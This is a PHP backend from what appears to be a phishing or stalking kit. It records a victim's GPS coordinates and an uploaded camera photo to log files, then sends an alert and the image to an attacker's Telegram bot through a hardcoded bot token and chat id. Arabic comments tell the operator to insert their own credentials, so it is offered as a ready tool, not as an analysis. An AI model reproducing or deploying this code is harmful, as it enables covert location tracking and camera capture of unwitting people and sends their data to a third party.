<?php
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['lat']) && isset($_GET['lon'])) {
    file_put_contents("logs/location.txt", "Lat: " . $_GET['lat'] . "\nLon: " . $_GET['lon']);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['image'])) {
    move_uploaded_file($_FILES['image']['tmp_name'], "logs/image.jpg");
}
?>
<?php
$bot_token = "5670694895:AAH5eMZfNc1O6bYEl3inJb-NjTObKBjoRUc"; // ← حط التوكن بتاعك هنا
$chat_id = "5523186139"; // ← حط الـ chat id بتاعك هنا

$message = "📍 تم سحب بيانات جديدة:\n";
$message .= "📸 صورة الكاميرا: [مرفقة]\n";

// ابعت الرسالة النصية
file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

// لو فيه صورة مرفقة:
$photo_path = "logs/image.jpg"; // ← غيّر لو عندك اسم تاني
if (file_exists($photo_path)) {
    $sendPhotoUrl = "https://api.telegram.org/bot$bot_token/sendPhoto";
    $post_fields = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile(realpath($photo_path))
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $sendPhotoUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    $output = curl_exec($ch);
}
?>
